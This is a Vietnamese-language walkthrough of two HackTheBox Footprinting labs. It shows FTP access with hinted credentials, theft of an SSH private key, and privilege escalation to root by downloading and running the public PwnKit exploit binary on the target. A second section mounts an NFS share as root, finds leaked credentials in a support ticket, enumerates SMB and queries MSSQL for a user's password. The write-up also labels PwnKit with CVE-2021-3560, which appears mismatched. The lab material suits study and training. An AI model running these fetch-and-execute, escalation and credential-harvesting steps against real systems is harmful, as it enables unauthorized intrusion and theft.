
PORT      STATE  SERVICE VERSION
14463/tcp closed unknown
16349/tcp closed unknown
25133/tcp closed unknown
35474/tcp closed unknown
63429/tcp closed unknown
```

Ôi vê lờ là rabbit hole :)) Chỉ còn cách là `ftp`
Đầu tiên dùng anonymous thì failed, quay lại gợi ý thì ta dùng được credential này: **`ceil:qwer1234`**

```zsh
❯ ftp 10.129.156.26
Connected to 10.129.156.26.
220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.156.26]
Name (10.129.156.26:kali): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
```

Nhưng mà không có gì
```zsh
ftp> ls -la
229 Entering Extended Passive Mode (|||44745|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root         4096 Nov 10  2021 .
drwxr-xr-x   2 root     root         4096 Nov 10  2021 ..
```

Không cay cú, tôi thử với `port 2121`
```zsh
ftp> ls -la
229 Entering Extended Passive Mode (|||2209|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||29956|)
150 Opening ASCII mode data connection for file list
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||58777|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |****************************************************************************************************************|  3381      418.10 KiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (11.71 KiB/s)
```

Ngon, giờ chỉ cần dùng key vào là done.
```zsh
❯ ll
total 4
-rw-rw-r-- 1 kali kali 3381 Nov 10  2021 id_rsa
                                                                                                                                                             
❯ chmod 600 id_rsa && ssh -i id_rsa ceil@inlanefreight.htb
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
```

Dễ dàng lấy được flag, nhưng tôi muốn nhiều hơn, tôi muốn lên root
```bash
ceil@NIXEASY:/tmp$ cat /home/flag/flag.txt 
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

```zsh
ceil@NIXEASY:~$ ls -la
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
ceil@NIXEASY:~$ sudo -l
[sudo] password for ceil: 
Sorry, user ceil may not run sudo on nixeasy.
```

Thử xem liệu có user nào khác không, và kết quả là `cry0l1t3`
```zsh
ceil@NIXEASY:~$ cat /etc/passwd | grep -v "nologin"
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
pollinate:x:110:1::/var/cache/pollinate:/bin/false
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
ceil:x:1000:1000:,,,:/home/ceil:/bin/bash
```

Thôi mình lười thì chạy `linpeas` cho nhanh.
**`Vulnerable to CVE-2021-3560`**

Tôi rất thích chơi với PwnKit, vì vậy đơn giản là:
Trên máy VM:
```zsh
❯ curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
                                                                                                                                                             
❯ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
```
Trên máy mục tiêu:
```zsh
ceil@NIXEASY:/tmp$ wget http://10.10.14.188:9999/PwnKit
--2025-03-31 09:57:15--  http://10.10.14.188:9999/PwnKit
Connecting to 10.10.14.188:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                                  100%[============================================================================>]  17.62K  64.3KB/s    in 0.3s    

2025-03-31 09:57:16 (64.3 KB/s) - ‘PwnKit’ saved [18040/18040]

ceil@NIXEASY:/tmp$ chmod +x PwnKit 
ceil@NIXEASY:/tmp$ ./PwnKit 
root@NIXEASY:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1000(ceil)
```

## **Happy Hacking**...

# Footprinting Lab - Medium

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

HINT: Trong SQL Management Studio, chúng ta có thể chỉnh sửa 200 mục nhập cuối cùng của cơ sở dữ liệu đã chọn và đọc các mục nhập tương ứng. Chúng ta cũng cần lưu ý rằng mỗi hệ thống Windows đều có một tài khoản Administrator.
## Phân tích

- a server that everyone on the internal network has access to
- a user named `HTB` has been created
-  Để ý HINT, có lẽ là MSSQL chăng?

## Chơi với nmap

```zsh
❯ echo "10.129.244.30   inlanefreight.htb" | sudo tee -a /etc/hosts
10.129.244.30   inlanefreight.htb
```

Quá nhiều cổng cho một cuộc tình :(
```zsh
❯ sudo nmap -sS -p- -T 4 --min-rate 3000 10.129.244.30 -oN mediumlab.txt -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 06:11 EDT
Initiating Ping Scan at 06:11
Scanning 10.129.244.30 [4 ports]
Completed Ping Scan at 06:11, 0.30s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 06:11
Scanning inlanefreight.htb (10.129.244.30) [65535 ports]
Discovered open port 445/tcp on 10.129.244.30
Discovered open port 111/tcp on 10.129.244.30
Discovered open port 135/tcp on 10.129.244.30
Discovered open port 139/tcp on 10.129.244.30
Discovered open port 3389/tcp on 10.129.244.30
Discovered open port 49666/tcp on 10.129.244.30
Discovered open port 5985/tcp on 10.129.244.30
Discovered open port 47001/tcp on 10.129.244.30
Discovered open port 49679/tcp on 10.129.244.30
Discovered open port 49664/tcp on 10.129.244.30
Discovered open port 49680/tcp on 10.129.244.30
Discovered open port 49665/tcp on 10.129.244.30
Discovered open port 49668/tcp on 10.129.244.30
Discovered open port 2049/tcp on 10.129.244.30
Discovered open port 49681/tcp on 10.129.244.30
Discovered open port 49667/tcp on 10.129.244.30
Completed SYN Stealth Scan at 06:11, 23.18s elapsed (65535 total ports)
Nmap scan report for inlanefreight.htb (10.129.244.30)
Host is up, received reset ttl 127 (0.27s latency).
Scanned at 2025-03-31 06:11:27 EDT for 23s
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       REASON
111/tcp   open  rpcbind       syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
2049/tcp  open  nfs           syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
49679/tcp open  unknown       syn-ack ttl 127
49680/tcp open  unknown       syn-ack ttl 127
49681/tcp open  unknown       syn-ack ttl 127
```
Bonus thêm:
```zsh
PORT      STATE SERVICE REASON          VERSION
49664/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Với số lượng cổng khổng lồ, điều này có quá nhiều thông tin cần xử lý, mình sẽ đưa ra vài ý tưởng chính:
- có 135,3389,5985,47001 điều này quá rõ ràng rằng ta phải tìm được cái thông tin gì đó đăng nhập thông qua **`WinRM, WMI hoặc RPC`**
- chúng ta phải tìm login creds từ các dịch vụ còn lại như SMB (139,445) hay NFS (111,2049).
- sau khi vào được thông qua rpc hay gì đó, chạy mssql rồi tìm pass của user htb

Bắt đầu với SMB thôi:
```zsh
❯ impacket-samrdump 10.129.244.30
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Retrieving endpoint list from 10.129.244.30
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
[*] No entries received.
```

Vậy ta nên chuyển sang NFS, phát hiện có chia sẻ NFS:
```zsh
❯ showmount -e 10.129.244.30
Export list for 10.129.244.30:
/TechSupport (everyone)
```

Tiến hành mount sang VM để truy cập:
```zsh
❯ mkdir target-NFS 
❯ sudo mount -t nfs 10.129.244.30:/ ./target-NFS/ -o nolock
❯ ls -la
total 4
drwxrwxrwx 2 nobody nogroup    64 Mar 31 05:05 .
drwxrwxr-x 3 kali   kali     4096 Mar 31 06:24 ..
drwx------ 2 nobody nogroup 65536 Nov 10  2021 TechSupport
❯ tree
.
└── TechSupport  [error opening dir]

2 directories, 0 files

❯ cd TechSupport
cd: permission denied: TechSupport
```

Đến bước này tôi gần như toang, cố gượng check UDP ports nhưng thất vọng:
```zsh
PORT     STATE SERVICE REASON
111/udp  open  rpcbind udp-response ttl 127
2049/udp open  nfs     udp-response ttl 127
```

Sau khi research một chút, việc chuyển sang user root trên VM có thể giúp ta truy cập. Qua tìm hiểu, lý do đằng sau nó như sau:

**1. Nguyên nhân gốc rễ:**

- Thư mục `/TechSupport` trên NFS server (Windows) được export với quyền `drwx------` (700), nghĩa là chỉ **owner** (người sở hữu) mới có quyền truy cập.
    
- Khi mount vào Linux, owner được map thành user `nobody` và group `nogroup` do không có UID/GID tương ứng giữa Windows và Linux.
    

**2. Tại sao user thường không truy cập được:**

- User thường (kali) không phải là `nobody`, cũng không thuộc group `nogroup`.
    
- Quyền `700` trên thư mục chỉ cho phép owner (`nobody`) truy cập → Kali user bị từ chối.
    
**3. Tại sao root lại truy cập được:**

- Root user có **đặc quyền vượt qua mọi hạn chế về quyền truy cập file system** (DAC - Discretionary Access Control).
    
- Dù không phải owner, root vẫn có thể đọc/ghi bất kỳ file/thư mục nào.
    

**4. Giải thích chi tiết qua các lệnh:**

```zsh
drwx------ 2 nobody nogroup 65536 Nov 10 2021 TechSupport
```
- `d`: Thư mục
    
- `rwx`: Owner (nobody) có đầy đủ quyền
    
- `---`: Group và Others không có quyền gì

**5. Tại sao Windows lại xuất hiện quyền như vậy:**

- Windows không dùng UID/GID như Linux, nên khi export qua NFS thường map mặc định sang nobody/nogroup.
    
- Nếu không cấu hình NFS user mapping đặc biệt, Linux client sẽ nhận owner là nobody.
    

**Cách khắc phục không cần root:**

- Mount với option `uid=` và `gid=` để chỉ định user/group cục bộ:
```zsh
❯ sudo mount -t nfs -o nfsvers=3,nolock 10.129.244.30:/TechSupport ./target-NFS/
```
- Hoặc thay đổi owner sau khi mount (cần quyền root):
    
```zsh
sudo chown kali:kali ./target-NFS/TechSupport
```

**Tóm lại:** Bạn vào được bằng root vì root bỏ qua permission checks, trong khi user thường bị chặn bởi cơ chế permissions tiêu chuẩn của Linux. Đây là hành vi đúng thiết kế của hệ thống Linux permissions.

Vậy chúng ta sẽ vào bằng root:

```zsh
> sudo -i
┌──(root㉿kali)-[~kali/Desktop/learning/mediumlab/target-NFS]
└─# cd TechSupport 
                                                                                                                                                             
┌──(root㉿kali)-[~kali/…/learning/mediumlab/target-NFS/TechSupport]
└─# ls -la
total 68
drwx------ 2 nobody nogroup 65536 Nov 10  2021 .
drwxrwxrwx 2 nobody nogroup    64 Mar 31 05:05 ..
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283649.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283650.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283651.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283652.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283653.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283654.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283655.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283656.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283657.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283658.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283659.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283660.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283661.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283662.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283663.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283664.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283665.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283666.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283667.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283668.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283669.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283670.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283671.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283672.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283673.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283674.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283675.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283676.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283677.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283678.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283679.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283680.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283681.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283682.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283683.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283684.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283685.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283686.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283687.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283688.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283689.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283690.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283691.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283692.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283693.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283694.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283695.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283696.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283697.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283698.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283699.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283700.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283701.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283702.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283703.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283704.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283705.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283706.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283707.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283708.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283709.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283710.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283711.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283712.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283713.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283714.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283715.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283716.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283717.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283718.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283719.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283720.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283721.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283722.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283723.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283724.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283725.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283726.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283727.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283728.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283729.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283730.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283731.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283732.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283733.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283734.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283735.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283736.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283737.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283738.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283739.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283740.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283741.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283742.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283743.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283744.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283745.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283746.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283747.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283748.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283749.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283750.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283751.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283752.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283753.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283754.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283755.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283756.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283757.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283758.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283759.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283760.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283761.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283762.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283763.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283764.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283765.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283766.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283767.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283768.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283769.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283770.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283771.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283772.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283773.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283774.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283775.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283776.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283777.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283778.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283779.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283780.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283781.txt
-rwx------ 1 nobody nogroup  1305 Nov 10  2021 ticket4238791283782.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283783.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283784.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283785.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283786.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283787.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283788.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283789.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283790.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283791.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283792.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283793.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283794.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283795.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283796.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283797.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283798.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283799.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283800.txt
-rwx------ 1 nobody nogroup     0 Nov 10  2021 ticket4238791283801.txt

```

lọc rác:
```zsh
ls -l | awk '$5 >0' 
-rwx------ 1 nobody nogroup 1305 Nov 10  2021 ticket4238791283782.txt
```
```zsh
cat ticket4238791283782.txt                                                          
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



---
```

Chú ý 2 dòng này:
`user="alex" 
`password="lol123!mD"`

giờ ta thử với rpc:
```zsh
❯ xfreerdp3 /u:alex /p:'lol123!mD' /v:10.129.244.30
```
được nhưng không thể kết nối đến cơ sở dữ liệu, có lẽ cần thông tin của admin?
![[./images/1.png]]

TÔi sẽ thử thêm với SMB
```zsh
❯ crackmapexec smb 10.129.244.30 --shares -u 'alex' -p 'lol123!mD'
SMB         10.129.244.30   445    WINMEDIUM        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINMEDIUM) (domain:WINMEDIUM) (signing:False) (SMBv1:False)
SMB         10.129.244.30   445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD 
SMB         10.129.244.30   445    WINMEDIUM        [+] Enumerated shares
SMB         10.129.244.30   445    WINMEDIUM        Share           Permissions     Remark
SMB         10.129.244.30   445    WINMEDIUM        -----           -----------     ------
SMB         10.129.244.30   445    WINMEDIUM        ADMIN$                          Remote Admin
SMB         10.129.244.30   445    WINMEDIUM        C$                              Default share
SMB         10.129.244.30   445    WINMEDIUM        devshare        READ,WRITE      
SMB         10.129.244.30   445    WINMEDIUM        IPC$            READ            Remote IPC
SMB         10.129.244.30   445    WINMEDIUM        Users           READ           
```

```zsh
❯ smbclient //10.129.244.30/devshare -U alex
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 31 07:26:51 2025
  ..                                  D        0  Mon Mar 31 07:26:51 2025
  important.txt                       A       16  Wed Nov 10 11:12:55 2021

                6367231 blocks of size 4096. 2586173 blocks available
smb: \> get important.txt 
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
                                                                                                                                                             
❯ smbclient //10.129.244.30/Users -U alex
Password for [WORKGROUP\alex]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Wed Nov 10 19:25:55 2021
  ..                                 DR        0  Wed Nov 10 19:25:55 2021
  alex                                D        0  Wed Nov 10 19:25:55 2021
  Default                           DHR        0  Tue Dec 15 05:32:11 2020
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018

                6367231 blocks of size 4096. 2586173 blocks available
```

Đọc nội dung của `important.txt`:
```zsh
❯ cat important.txt
sa:87N1ns@slls83
```

Và chúng ta vào lại cơ sở dữ liệu, lần đầu vào bằng sa thì sai, đọc lại gợi ý, tôi nghĩ mình nên run as admin và nhập password bằng tay :( `87N1ns@slls83 `, nó sẽ như này:

![](<./images/2.png>)
Việc đơn giản chúng ta tạo một query mới thôi:
```sql
use accounts; -- chạy luôn thằng này
select name, password from dbo.devsacc where name = 'HTB'; -- chạy nữa là done
```

![](<./images/3.png>)

và thế là hết. happy hacking......... à mà khoan, nếu pass của sa trùng với pass của admin thì evil-winrm sang luôn shell admin nhỉ? hehehe

```zsh
